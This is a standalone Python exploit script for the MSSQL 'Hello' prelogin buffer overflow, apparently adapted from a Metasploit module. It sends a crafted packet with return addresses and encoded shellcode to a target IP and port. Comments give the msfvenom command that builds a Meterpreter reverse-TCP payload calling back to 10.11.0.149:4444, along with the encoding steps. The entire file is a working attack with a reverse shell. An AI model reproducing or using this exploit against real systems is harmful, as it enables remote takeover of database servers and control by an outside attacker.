#!/usr/bin/python

#MSSQL Hello Buffer Overflow
#Converted from Metasploit Module
#Created By Nick Wiebelhaus
#4/5/2017
#This was not discovered by me but was modified into a standalone exploit by me
#
#Usage Hello_SQL_Buffer_Overflow.py <ip of target> <TCP port of target SQL>


import sys, socket
import string
import random

host = sys.argv[1]
port = int(sys.argv[2])

#ret = ["\xba\x8a\xb6\x42", "\x50\x1e\xd0\x42"]

#First hardcoded buffer#
bufed1 = ""
bufed1 += "\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b"
bufed1 += "\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02"
bufed1 += "\x10\x00\x00\x00"

###############Create the Shellcode##################
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.149 LPORT=4444 -f raw -o hellobuffer
#ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
#nasm > sub esp, 0xDAC
#pearl -e 'print "\x81\xec\xac\x0d\x00\x00"' > adjstack
#cat adjstack hellobuffer > helloshellcode
#Hexdump -C helloshellcode 
#cat helloshellcode | msfvenom -p - -f python -a x86 --platform Windows -n 146 -e x86/shikata_ga_nai -b "\x00"

#Attempting to read payload from STDIN…
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 366 (iteration=0)
#x86/shikata_ga_nai chosen with final size 366
#Successfully added NOP sled from x86/single_byte
#Payload size: 512 bytes
#Final size of python file: 2458 bytes
#Make sure payload size matches the 512 byte size

#Created an Adjusted Payload Replace this Shellcode with your Generated Shellcode#
buf =  ""
buf += "\x42\x41\x42\xf8\x93\x92\x43\xd6\x91\x9b\x90\x48\x49"
buf += "\x37\x91\x93\xf9\x9f\x3f\x91\x49\x93\x3f\x99\x4a\xf8"
buf += "\x91\x40\x43\xf8\x48\x37\x2f\x4a\xd6\xf5\xf5\x2f\x90"
buf += "\x98\xfc\x41\x48\x2f\xf8\x49\x91\x9b\x93\x93\x92\x99"
buf += "\x48\x93\xfc\x4b\x2f\x48\xf9\xf5\x3f\x4a\x9f\x4b\x4b"
buf += "\xf5\x43\x9f\x42\x91\x92\x37\x3f\xf5\x98\x43\x27\x98"
buf += "\x4b\xfc\x9b\x40\x93\xf8\xf8\xf8\x4a\xfd\x41\x91\x4a"
buf += "\x92\x37\x2f\x43\x4a\xf9\x48\x40\x41\x92\x27\x2f\x37"
buf += "\x27\xfd\x43\x93\x4a\x48\x41\xf9\xf9\x90\x48\xf5\x42"
buf += "\x3f\x9b\x3f\xfd\x90\xd6\xfc\xfc\x37\x92\x9f\x40\xf5"
buf += "\x27\xf9\x93\xfd\x3f\x4a\xf9\x37\xf5\x90\x9f\x90\x27"
buf += "\x40\x92\xf8\xda\xdd\xd9\x74\x24\xf4\x5f\x33\xc9\xbd"
buf += "\xde\x6f\x4e\x3d\xb1\x55\x83\xef\xfc\x31\x6f\x16\x03"
buf += "\x6f\x16\xe2\x2b\xee\xa2\x91\xde\xf1\x3a\x16\x08\x73"
buf += "\x3a\xe6\xc8\x14\xb2\x03\xf9\x14\xa0\x40\xa9\xa4\xa2"
buf += "\x05\x45\x4e\xe6\xbd\xde\x22\x2f\xb1\x57\x88\x09\xfc"
buf += "\x68\xa1\x6a\x9f\xea\xb8\xbe\x7f\xd3\x72\xb3\x7e\x14"
buf += "\x6e\x3e\xd2\xcd\xe4\xed\xc3\x7a\xb0\x2d\x6f\x30\x54"
buf += "\x36\x8c\x80\x57\x17\x03\x9b\x01\xb7\xa5\x48\x3a\xfe"
buf += "\xbd\x8d\x07\x48\x35\x65\xf3\x4b\x9f\xb4\xfc\xe0\xde"
buf += "\x79\x0f\xf8\x27\xbd\xf0\x8f\x51\xbe\x8d\x97\xa5\xbd"
buf += "\x49\x1d\x3e\x65\x19\x85\x9a\x94\xce\x50\x68\x9a\xbb"
buf += "\x17\x36\xbe\x3a\xfb\x4c\xba\xb7\xfa\x82\x4b\x83\xd8"
buf += "\x06\x10\x57\x40\x1e\xfc\x36\x7d\x40\x5f\xe6\xdb\x0a"
buf += "\x4d\xf3\x51\x51\x19\x30\x58\x6a\xd9\x5e\xeb\x19\xeb"
buf += "\xc1\x47\xb6\x47\x89\x41\x41\xa8\xa0\x36\xdd\x57\x4b"
buf += "\x47\xf7\x93\x1f\x17\x6f\x32\x20\xfc\x6f\xbb\xf5\x69"
buf += "\x75\x2b\xfc\x66\x75\x3e\x68\x7b\x75\x51\x35\xf2\x93"
buf += "\x01\x95\x54\x0c\xe1\x45\x15\xfc\x89\x8f\x9a\x23\xa9"
buf += "\xaf\x70\x4c\x43\x40\x2d\x24\xfb\xf9\x74\xbe\x9a\x06"
buf += "\xa3\xba\x9c\x8d\x46\x3a\x52\x66\x22\x28\x82\x17\xcc"
buf += "\xb0\x52\xb2\xcc\xda\x56\x14\x9a\x72\x54\x41\xec\xdc"
buf += "\xa7\xa4\x6e\x1a\x57\x39\x47\x50\x61\xaf\xe7\x0e\x8d"
buf += "\x3f\xe8\xce\xdb\x55\xe8\xa6\xbb\x0d\xbb\xd3\xc4\x9b"
buf += "\xaf\x4f\x50\x24\x86\x3c\xf3\x4c\x24\x1a\x33\xd3\xd7"
buf += "\x49\x40\x14\x27\x0f\x64\xbd\x40\xef\x28\x3d\x91\x85"
buf += "\xa8\x6d\xf9\x52\x87\x82\xc9\x9b\x02\xcb\x41\x11\xc2"
buf += "\xb9\xf0\x26\xcf\x1c\xad\x27\xe3\x84\xb8\xa9\x04\x3b"
buf += "\xc5\x4b\x39\xed\xfc\x39\x7a\x2d\xbb\x32\x31\x10\xea"
buf += "\xd8\x39\x06\xec\xc8"

#Creates random strings the length of the xrange number#
random1 = ''.join([random.choice(string.ascii_letters) for n in xrange(528)])
random2 = ''.join([random.choice(string.ascii_letters) for n in xrange(4)])
random3 = ''.join([random.choice(string.ascii_letters) for n in xrange(88)])

#The full exploit put together#
exploit = bufed1 + random1 + "\x1B\xA5\xEE\x34" + random2 + "\xba\x8a\xb6\x42" + "\x50\x1e\xd0\x42" + "\x50\x1e\xd0\x42" + "3333" + "\x50\x1e\xd0\x42" + "\x50\x1e\xd0\x42" + random3 + buf + "\x00\x24\x01\x00\x00"

#Send the exploit to the target IP and Port#
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
	s.sendall(exploit)
	s.close()
	print "\ Done. Did you get a reverse shell?"
except:
	print "Could not connect to mssql"
